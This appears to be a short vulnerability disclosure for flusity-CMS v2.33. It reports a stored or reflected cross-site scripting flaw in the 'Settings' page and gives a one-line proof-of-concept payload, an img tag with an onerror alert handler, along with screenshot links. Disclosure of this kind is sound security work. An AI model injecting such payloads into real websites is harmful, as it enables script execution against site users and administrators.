target:https://github.com/flusity/flusity-CMS
version: v2.33

There is Cross-Site Scripting (XSS)  vulnerability within the "Settings" .

![1](https://github.com/TinkAnet/cve/assets/118334129/4a62f362-d435-4e8f-ba3c-765a82a4bcbf)


poc:
```
 "><img src=1 onerror=alert(1)> 
```
successed

![2](https://github.com/TinkAnet/cve/assets/118334129/f038e3b3-46b9-4a01-a3b4-f512cf0dd18c)

